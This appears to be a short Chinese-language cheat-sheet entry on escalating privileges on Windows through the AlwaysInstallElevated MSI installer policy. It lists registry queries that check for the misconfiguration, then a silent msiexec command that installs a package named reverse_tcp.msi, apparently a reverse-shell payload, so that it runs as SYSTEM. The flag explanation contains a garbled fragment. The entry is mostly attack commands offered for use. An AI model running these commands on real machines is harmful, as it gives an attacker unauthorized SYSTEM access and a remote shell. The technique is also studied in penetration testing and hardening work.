# 利用MSI安全策略提权

如果用户配置MSI安装策略时，启用了"始终以提升的权限安装"，会导致任何权限的用户都可以以SYSTEM权限安装MSI程序

确认系统是否存在漏洞

```
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

利用：(quiet#禁止安全期间向用户发送任何信息，qn#无GUI模型，i#常规an'z)

```
msiexec /quiet /qn /i reverse_tcp.msi
```
